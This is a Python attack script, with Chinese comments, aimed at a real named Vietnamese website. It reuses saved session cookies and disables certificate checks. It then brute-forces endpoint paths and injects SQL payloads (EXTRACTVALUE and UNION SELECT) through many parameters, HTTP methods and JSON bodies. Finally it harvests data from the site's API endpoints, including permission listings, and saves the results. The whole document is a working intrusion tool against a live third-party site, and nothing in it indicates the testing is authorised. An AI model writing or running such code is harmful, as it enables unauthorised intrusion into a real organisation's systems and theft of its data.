#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings()

class FinalAttack:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.all_results = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def brute_force_endpoints(self):
        """暴力枚举端点"""
        print("[*] 暴力枚举端点...")
        
        base_paths = ['/Account', '/Handle', '/Admin', '/api', '/Api', '/API']
        actions = ['Get', 'List', 'Search', 'Find', 'Query', 'Load', 'Fetch', 'Retrieve', 
                   'User', 'Users', 'Customer', 'Customers', 'Info', 'Details', 'Profile']
        
        found = []
        for base in base_paths:
            for action in actions:
                endpoints = [
                    f"{base}/{action}",
                    f"{base}/Get{action}",
                    f"{base}/Get{action}ById",
                    f"{base}/Get{action}Info",
                ]
                
                for endpoint in endpoints:
                    url = f"{self.base_url}{endpoint}?id=1"
                    try:
                        r = self.session.get(url, timeout=5)
                        if r.status_code in [200, 500]:
                            print(f"    [+] {endpoint}: {r.status_code}")
                            found.append(endpoint)
                    except:
                        pass
        
        return found
    
    def test_all_http_methods(self):
        """测试所有HTTP方法"""
        print("[*] 测试所有HTTP方法...")
        
        endpoint = '/Account/GetUserInfo'
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD', 'TRACE']
        
        for method in methods:
            url = f"{self.base_url}{endpoint}?id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
            try:
                r = self.session.request(method, url, timeout=10)
                if 'TEST' in r.text or 'XPATH' in r.text.upper() or r.status_code != 404:
                    print(f"    [!] {method}: Status={r.status_code}")
                    if 'TEST' in r.text:
                        print(f"        [+] 发现TEST")
            except:
                pass
    
    def test_all_handle_params(self):
        """测试所有Handle端点参数"""
        print("[*] 深度测试Handle参数...")
        
        endpoint = '/Handle/SearchListCustomer'
        payload = "1' UNION SELECT 'TEST'--"
        
        params = ['id', 'ID', 'Id', 'customer_id', 'customerID', 'customerId', 
                  'user_id', 'userID', 'userId', 'q', 'query', 'search', 'keyword',
                  'name', 'email', 'mobile', 'phone', 'page', 'limit', 'offset',
                  'sort', 'order', 'filter', 'where', 'condition', 'value']
        
        for param in params:
            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if 'TEST' in r.text:
                    print(f"    [!] 参数有效: {param}")
                    self.all_results[f'{endpoint}_{param}'] = 'SQL Injection'
            except:
                pass
    
    def test_parameter_pollution(self):
        """测试参数污染"""
        print("[*] 测试参数污染...")
        
        endpoint = '/Handle/SearchListCustomer'
        payload = "1' UNION SELECT 'TEST'--"
        
        # 多个同名参数
        url = f"{self.base_url}{endpoint}?id={payload}&id=1&id=2"
        try:
            r = self.session.get(url, timeout=10)
            if 'TEST' in r.text:
                print(f"    [!] 参数污染有效")
        except:
            pass
    
    def test_json_variations(self):
        """测试JSON变体"""
        print("[*] 测试JSON变体...")
        
        endpoint = '/Handle/SearchListCustomer'
        payload = "1' UNION SELECT 'TEST'--"
        
        variations = [
            {'id': payload},
            {'ID': payload},
            {'q': payload},
            {'search': payload},
            {'query': payload},
            {'id': [payload, '1']},
            {'id': {'value': payload}},
        ]
        
        for var in variations:
            try:
                r = self.session.post(f"{self.base_url}{endpoint}", json=var, timeout=10)
                if 'TEST' in r.text:
                    print(f"    [!] JSON变体有效: {var}")
            except:
                pass
    
    def extract_all_api_data(self):
        """提取所有API数据"""
        print("[*] 提取所有API数据...")
        
        endpoints_config = [
            ('/Handle/SearchListProvince', [{}]),
            ('/Handle/SearchListWardByDistrictID', [{'DistrictID': i} for i in range(1, 20)]),
            ('/Handle/SearchListDistrictByProvinceID', [{'ProvinceID': i} for i in range(1, 20)]),
            ('/Handle/SearchListWareHouse', [{}]),
            ('/Handle/SearchListFunctionalByGroupPermissionID', [{'GroupPermissionID': i} for i in range(0, 10)]),
        ]
        
        all_data = {}
        for endpoint, params_list in endpoints_config:
            for params in params_list:
                url = f"{self.base_url}{endpoint}"
                query = "&".join([f"{k}={v}" for k, v in params.items()])
                test_url = f"{url}?{query}"
                
                try:
                    r = self.session.get(test_url, timeout=10)
                    if r.status_code == 200:
                        try:
                            data = json.loads(r.text)
                            if isinstance(data, list) and len(data) > 0:
                                key = f"{endpoint}_{query}"
                                all_data[key] = {
                                    'count': len(data),
                                    'sample': data[:3]
                                }
                                print(f"    [+] {key}: {len(data)} 条")
                        except:
                            pass
                except:
                    pass
        
        self.all_results['api_data'] = all_data
    
    def run_all(self):
        """执行所有攻击"""
        print("="*60)
        print("最终全面攻击")
        print("="*60)
        
        self.brute_force_endpoints()
        self.test_all_http_methods()
        self.test_all_handle_params()
        self.test_parameter_pollution()
        self.test_json_variations()
        self.extract_all_api_data()
        
        # 保存结果
        with open('final_attack_results.json', 'w', encoding='utf-8') as f:
            json.dump(self.all_results, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 攻击完成，结果已保存")

if __name__ == "__main__":
    attack = FinalAttack()
    attack.run_all()